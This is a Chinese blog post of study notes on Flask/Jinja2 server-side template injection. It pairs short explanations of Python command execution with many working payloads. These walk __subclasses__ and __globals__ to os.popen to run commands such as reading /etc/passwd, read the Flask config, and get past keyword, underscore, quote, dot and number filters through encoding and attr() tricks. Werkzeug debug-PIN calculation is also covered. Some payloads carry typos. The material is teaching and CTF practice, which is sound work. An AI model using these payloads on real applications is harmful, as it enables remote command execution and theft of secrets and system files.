<h5 id="os模块直接执行命令"><a href="#os模块直接执行命令" class="headerlink" title="os模块直接执行命令"></a>os模块直接执行命令</h5><p>在其他函数中执行os命令,在os模块当中存在os.system和两个执行系统命令的函数，下面诉一下这两个命令执行函数与subprocess.Popen函数的区别：</p>
<ol>
<li><p><code>os.system</code>:</p>
<p>该函数返回命令执行结果的返回值，system()函数在执行过程中进行了以下三步操作：</p>
<ul>
<li>fork一个子进程；</li>
<li>在子进程中调用exec函数去执行命令；</li>
<li>在父进程中调用wait（阻塞）去等待子进程结束。</li>
<li>对于fork失败，system()函数返回-1。由于使用该函数经常会莫名其妙地出现错误，但是直接执行命令并没有问题，所以一般建议不要使用。</li>
</ul>
</li>
<li><p><code>os.popen</code>:</p>
<p>popen() 创建一个管道，通过fork一个子进程,然后该子进程执行命令。返回值在标准IO流中，该管道用于父子进程间通信。父进程要么从管道读信息，要么向管道写信息，至于是读还是写取决于父进程调用popen时传递的参数（w或r）。通过popen函数读取命令执行过程中的输出示例如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
<span class="token keyword">import</span> os

p<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ssh 10.3.16.121 ls'</span><span class="token punctuation">)</span>
x<span class="token operator">=</span>p<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> x
p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<p>简单来说，os.system模块无法获得执行命令后的输出，但os.popen模块会返回执行命令的结果，即使发生错误，也会返回结果，至于第三个模块，他比popen模块还要灵活，更便于使用。</p>
<h5 id="importlib类执行命令"><a href="#importlib类执行命令" class="headerlink" title="importlib类执行命令"></a>importlib类执行命令</h5><p>可以载第三方库，使用load_module加载us</p>
<h5 id="subprocess-Popen类执行命令"><a href="#subprocess-Popen类执行命令" class="headerlink" title="subprocess.Popen类执行命令"></a>subprocess.Popen类执行命令</h5><p>从python2.4版本开始，可以用subprocess这个模块来产生子进程，并连接到子进程的</p>
<p>输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。</p>
<p>subprocess意在替代其他几个老的模块或者函数，比如: os.system、 os.popen 等函数。</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;[].__ class__,__base__,__subclasses__()[200](&#39;ls &#x2F;&#39;,shell&#x3D;True.stdout&#x3D;-1).communicate()[O].strip()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="常见的过滤与绕过"><a href="#常见的过滤与绕过" class="headerlink" title="常见的过滤与绕过"></a>常见的过滤与绕过</h4><h5 id="过滤绕过大括号"><a href="#过滤绕过大括号" class="headerlink" title="过滤绕过大括号"></a>过滤绕过大括号</h5><p>这里是指：<code>&#123;&#123;&#125;&#125;</code>这种双重大括号被过滤，并不是指大括号被完全过滤。</p>
<p><code>&#123;%%&#125;</code>的使用介绍：这个符号是属于flask的控制语句，且以<code>&#123;%end...%&#125;</code>结尾，可以通过控制语句定义变量写循环，判断。用法如下：</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;% if 2&gt;1 %&#125;abc&#123;%endif%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这段代码的意思假如<code>2&gt;1</code>,则会输出中间的abc然后结束，这个大概的用法就是假如前边的判断为真，则输出中间的字符，我们可以用这个简单的代码来判断这个符号是否被过滤。</p>
<p>假设这个符号没有被过滤，我们便可以用以下代码来进行命令执行：</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;%printf(&quot;&quot;.__class__.__base__.__subclasses__()[目标方法所在子类的位次].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;.read()))%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>正常情况下不会将结果回显出来，于是我们用print将其输出出来。</p>
<h5 id="getitem绕过中括号过滤"><a href="#getitem绕过中括号过滤" class="headerlink" title="getitem绕过中括号过滤"></a>getitem绕过中括号过滤</h5><p><code>__getitem__</code>魔术方法：getitem()是python中的一个魔术方法，对字典使用时，传入字符串，返回字典相对应键所对应的值；对列表使用时，传入整数返回列表对应索引的值。</p>
<p>通过这个方法我们可以绕过中括号，以课程中给的靶场为例，我们正常输入会回显内容，但我们输入中括号，就会被过滤：</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B7.png" alt="正常回显"></p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E4%B8%AD%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A41.png" alt="过滤"></p>
<p>这种时候我们之际用getitem方法替换中括号即可。</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B72.png" alt="绕过"></p>
<p>接下来正常执行就行。</p>
<h5 id="单双引号过滤和绕过"><a href="#单双引号过滤和绕过" class="headerlink" title="单双引号过滤和绕过"></a>单双引号过滤和绕过</h5><p><code>request</code>；他可以在flask中可以访问基于http请求传递的所有信息，此处的request并非python中的包，而是在flask内部的函数。</p>
<p>以下是常见的方法：</p>
<pre class="line-numbers language-none"><code class="language-none">request.args.key   获取get传入得key的值
request.valuse.x1  所有参数
request.cookies    获取cookie传入的参数
request.headers    获取请求头请求参数
request.from.key   获取post传入的参数
request.data       获取post传入的参数（Content-Type:a&#x2F;b）
request.json       获取post传入的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>以视频中的靶场为例：</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B71.png"></p>
<p>构造的payload当中有单双引号存在时，就会被过滤，但假如我们利用request，就可以成功绕过，以<code>request.args.key</code>为例：</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B72.png"></p>
<p>这样，我们就可以从get传参中得到我们想要的值。其他的方式于上边演示的方法类似。</p>
<h5 id="过滤器绕过下划线"><a href="#过滤器绕过下划线" class="headerlink" title="过滤器绕过下划线"></a>过滤器绕过下划线</h5><p>过滤器：过滤器通过管道符<code>|</code>与变量连接，并且在括号中可能有可选参数。</p>
<p>flask常见过滤器：</p>
<pre class="line-numbers language-none"><code class="language-none">length()				获取应该学列或者字典的长度并将其返回；
int()					将值转换为int型
float()					将值转换为float型
lower()					将字符串转换为小写
upper()					将字符串转化为大写
reverse()				反转字符串
replace(value,old,new)	将value中的old替换为new
list()					将变量转换为列表类型；
string()				将变量转换为字符串类型的
join()					将一个序列中的参数值拼接成字符串，通常有python内置的dict()配合使用；
attr()					获取对象的属性<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这些都可以在特殊过滤上使用，单比较常用的是<code>attr()</code>，用法如下：</p>
<ul>
<li><p>使用request</p>
<p><code>&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code>&#x3D;<code>&#123;&#123;[]|attr(request.args.class)|attr(request.args.base)|attr(request.args.sub)()&#125;&#125;</code></p>
<p>此处需注意，subclasses__()中的这个括号要写在attr()这个后边，不能直接写在括号里</p>
</li>
<li><p>unicode编码绕过，这种方法就是将<code>__class__</code>等代码全部进行编码，再填入attr()括号中，如下：</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;&#39;&#39;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(199)|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()&#125;&#125;
这段代码解码出来为：
&#123;&#123;&#39;&#39;|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getiitem__&quot;)(199)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这样也能绕过</p>
</li>
<li><p>十六位编码绕过：这个与上边的unicode编码差不多，也是将中间的内容进行编码之后再写入，也能成功绕过。</p>
</li>
<li><p>base64编码绕过，与上边大差不差，不同点在于编码之后要解码，如：<code>attr(&quot;__class__&quot;)</code>&#x3D;<code>attr(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;))</code>,不适用于python3。</p>
</li>
<li><p>格式化字符串：%c%(95)就是下划线，将下划线替代之后即可，如下：attr(“%c%cclass%c%c”%(95,95,95,95))</p>
</li>
</ul>
<h5 id="点的过滤和绕过"><a href="#点的过滤和绕过" class="headerlink" title="点的过滤和绕过"></a>点的过滤和绕过</h5><p>点过滤，就是:<code>.</code>被过滤，同样可以拿attr绕过，但太麻烦，也可以直接用<code>[]</code>替代点，如下：</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;&#39;&#39;[&#39;__class__&#39;][&#39;__base__&#39;][&#39;__subclass__&#39;]()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h5><ul>
<li><p>编码绕过：在上边下划线绕过有讲，可以进行unicode、base64、十六位编码，都能绕过，注意：base64编码需要解码。</p>
</li>
<li><p>简单拼接：使用<code>+</code>号将关键字拆分为几段再拼接起来，如’cl’+’ass’&#x3D;’class’</p>
</li>
<li><p>jinjia2模板中的<code>~</code>:<code>&#123;%set a="__cla"%&#125;&#123; %set b= &quot;ss__&quot;%&#125;&#123;a~b&#125;</code></p>
</li>
<li><p>使用过滤器（rever反转、replace替换、join拼接等）：<code>&#123;%set a="_ ssalc__ "Ireverse%&#125;&#123;&#123;a&#125;&#125;</code></p>
<p>如下图： </p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4.png"></p>
</li>
<li><p>利用python的char():<br><code>&#123;%sett chr=url_for.__globals__['__builtins__'].chr%&#125;&#123;&#123;""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97 )%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;</code></p>
</li>
</ul>
<h5 id="数字过滤"><a href="#数字过滤" class="headerlink" title="数字过滤"></a>数字过滤</h5><ul>
<li><p>length会回显出字符串的长度，并且可以加减乘，于是在数字被过滤的时候我们可以用这种方法来绕过这种过滤，如下，现假设我们要访问199位次的方法:</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;%set &#39;aaaaaaaaaaaaaaaaaaa&#39;|length*&#39;aaaaaaaaaa&#39;|length+&#39;aaaaaaaaa&#39;|length&#125;&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[a].__init__.__globals__[&#39;os&#39;].popen(&#39;cat &#x2F;flag&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>像这样，我们便可以成功绕过数字。</p>
</li>
<li><p>数字过滤还有可以用全角数字绕过：<code>１２３４５６７８９０</code>用这样的数字去替换原本的数字。</p>
</li>
<li><p>还可以用count，如：</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;%set a&#x3D;dict(aaaaaaa&#x3D;x)|join|count%&#125;&#123;&#123;a&#125;&#125;
#会输出7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ul>
<h5 id="获取config文件"><a href="#获取config文件" class="headerlink" title="获取config文件"></a>获取config文件</h5><p>在部分情况时，flag会藏在这个文件中，假如在没有过滤得情况下，我们可以直接用直接读取文件，但假若他存在过滤的话，我们就需要用其他的方法对她进行读取。</p>
<p>flask内置函数：</p>
<pre class="line-numbers language-none"><code class="language-none">lipsum		可加载第三方库
urk_for		可返回url路径
get_flashed_message 可获取信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>flask内置对象：可利用已加载内置函数或对象，可利用内置函数调用current_app模块进而查看配置文件</p>
<pre class="line-numbers language-none"><code class="language-none">cycler
joiner
namespace
config
request
session<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;
&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;
这两条代码都是获取当前程序下的config文件。也就是flask的config文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h5 id="混合过滤"><a href="#混合过滤" class="headerlink" title="混合过滤"></a>混合过滤</h5><p>获取符号：</p>
<p>当符号被过滤时，我们不但可以利用编码绕过，还可以利用flask内置函数和对象获取符号；</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A41.png"></p>
<p>特点二：在部分情况回过滤下滑线和数字，那么<code>__getitem__</code>便无法使用，这时，我们可以用<code>pop</code>方法来替代此方法。</p>
<h4 id="无回现ssti"><a href="#无回现ssti" class="headerlink" title="无回现ssti"></a>无回现ssti</h4><p>与无回现rce一样主要方法就，反弹shell，带外，盲注。用几道题来演示一下几种方法</p>
<h2 id="debug-pin码计算"><a href="#debug-pin码计算" class="headerlink" title="debug pin码计算"></a>debug pin码计算</h2><p>pin码：对于有文件包含和文件读取的漏洞，且开启debug功能想要执行执行指令还需输入pin码，输入pin码之后可以输入命令值执行</p>
<p><strong>pin码的生成原理</strong></p>
<p>pin码主要有六个参数构成</p>
<pre class="line-numbers language-none"><code class="language-none">username    执行代码时候的用户名
getattr(app,&quot;__name__&quot;,app.__class__.__name__)通常为默认值 Flask
modname  默认值flask.app
getattr(mod,&quot;__file__&quot;,None)  app.py所在文件路径
str(uuid.getnode())  电脑上mac地址
get_machine_id()  根据操作系统不同，有四种获取方式。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>获取当前用户名：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> getpass
username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>获取app对象module属性：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">import</span> typing <span class="token keyword">as</span> t
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

modname <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span><span class="token string">"__module__"</span><span class="token punctuation">,</span>t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span>
mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>mod<span class="token punctuation">)</span>
<span class="token comment">#测试回显：&lt;module 'flask.app' from '/opt/flask1/lib/python3.11/site-packages/flask/app.py'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>获取mod的<code>__file__</code>属性，app.py文件所在位置：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">import</span> typing <span class="token keyword">as</span> t
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

modname <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span><span class="token string">"__module__"</span><span class="token punctuation">,</span>t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span>
mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span><span class="token string">"__file__"</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#测试结果：/opt/flask1/lib/python3.11/site-packages/flask/app.py</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>获取uuid，实际上就是当前网卡的物理地址的整型</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> uuid
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>实操获取数据过程</strong>3</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">阿巴</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/08/09/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">http://example.com/2023/08/09/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/20/paython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="python沙箱逃逸"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">python沙箱逃逸</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/03/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%89/" title="外部实体注入攻击（XXE）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">外部实体注入攻击（XXE）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/07/20/CTFshow_php%E7%89%B9%E6%80%A7/" title="ctfshow__PHP特性"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-20</div><div class="title">ctfshow__PHP特性</div></div></a></div><div><a href="/2023/08/20/Nepctf2023%E5%A4%8D%E7%8E%B0/" title="Nepctf2023复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-20</div><div class="title">Nepctf2023复现</div></div></a></div><div><a href="/2023/07/16/PHP%E7%89%B9%E6%80%A7/" title="PHP特性"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-16</div><div class="title">PHP特性</div></div></a></div><div><a href="/2023/08/03/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%89/" title="外部实体注入攻击（XXE）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-03</div><div class="title">外部实体注入攻击（XXE）</div></div></a></div><div><a href="/2023/08/03/ctfshow%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="ctfshow__反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-03</div><div class="title">ctfshow__反序列化</div></div></a></div><div><a href="/2023/08/20/ctfshow%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="ctfshow—命令执行"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-20</div><div class="title">ctfshow—命令执行</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">阿巴</div><div class="author-info__description">仰天大笑出门去，我辈岂是蓬蒿人</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SSTI模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flask%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">flask基本介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E7%9A%84%E5%8F%98%E9%87%8F%E4%B8%8E%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">flask的变量与方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flask%E6%A8%A1%E6%9D%BF%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.</span> <span class="toc-text">flask模板介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">模板注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.1.</span> <span class="toc-text">flask漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A4%E6%96%AD"><span class="toc-number">1.3.2.</span> <span class="toc-text">漏洞的判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E5%92%8C%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.3.</span> <span class="toc-text">继承关系和魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">继承关系</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">常用注入模块详解</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.3.3.2.1.</span> <span class="toc-text">文件读取</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0eval%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.3.3.1.</span> <span class="toc-text">内建函数eval执行命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#os%E6%A8%A1%E5%9D%97%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.3.3.2.</span> <span class="toc-text">os模块直接执行命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#importlib%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.3.3.3.</span> <span class="toc-text">importlib类执行命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#subprocess-Popen%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.3.3.4.</span> <span class="toc-text">subprocess.Popen类执行命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BF%87%E6%BB%A4%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.4.</span> <span class="toc-text">常见的过滤与绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.3.3.4.1.</span> <span class="toc-text">过滤绕过大括号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 